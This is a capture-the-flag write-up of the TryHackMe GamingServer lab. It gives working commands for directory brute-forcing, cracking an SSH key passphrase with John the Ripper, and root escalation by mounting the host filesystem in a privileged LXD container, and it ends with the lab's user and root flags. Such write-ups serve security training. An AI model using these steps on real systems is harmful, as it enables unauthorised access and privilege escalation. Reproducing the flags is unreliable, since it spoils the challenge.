# GamingServer-Walkthrough
Documentation of my cybersecurity labs and penetration testing challenges."
📁 TryHackMe: GamingServer Write-up
📝 Lab Description
GamingServer is a boot-to-root laboratory on TryHackMe that focuses on web enumeration, cryptography, and Linux privilege escalation via LXD groups.

🛠️ Tools Used
Nmap (Network Scanning)

Gobuster (Directory Brute-forcing)

John the Ripper (Passphrase Cracking)

SSH (Remote Access)

LXD/LXC (Privilege Escalation)

🚀 Execution Steps
1. Enumeration
Initially, I scanned the target machine using nmap and discovered Port 22 (SSH) and Port 80 (HTTP) were open. I then used gobuster to find a hidden directory:

Bash
gobuster dir -u http://<Machine_IP> -w /usr/share/wordlists/dirb/common.txt
I found the /secret/ directory which contained an RSA private key file named secretKey.

2. Initial Access
The RSA key was encrypted. I used ssh2john to convert it into a crackable format and then used john with the rockyou.txt wordlist:

Bash
ssh2john secretKey > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
Cracked Passphrase: letmein

Using the key and passphrase, I logged in as user john:

Bash
ssh -i secretKey john@<Machine_IP>
3. Privilege Escalation (Root)
After logging in, I checked my user privileges with the id command and found that the user was a member of the lxd group.

I built an Alpine image on my local machine and transferred it to the target. Using the LXD containerization exploit, I mounted the host's root filesystem inside a container:

Bash
lxc image import ./alpine-v3.13.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
Once inside the container, I accessed the root flag at /mnt/root/root/root.txt.

🏁 Flags
User Flag: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

Root Flag: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
